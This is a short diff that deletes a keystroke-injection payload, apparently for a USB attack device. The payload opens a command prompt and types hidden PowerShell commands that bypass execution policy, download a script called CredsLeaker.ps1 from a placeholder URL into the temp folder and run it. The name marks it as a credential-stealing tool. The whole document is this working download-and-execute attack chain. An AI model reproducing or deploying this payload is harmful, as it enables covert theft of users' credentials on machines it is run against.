@@ -1,4 +1,0 @@
-Press:131+114
-PrintLine:cmd
-PrintLine:powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass "Invoke-RestMethod -uri \"YOUR_URL/CredsLeaker.ps1/CredsLeaker.ps1\" -OutFile %TEMP%\cl.ps1\"
-PrintLine:powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass -file %TEMP%\cl.ps1 -mode "dynamic"
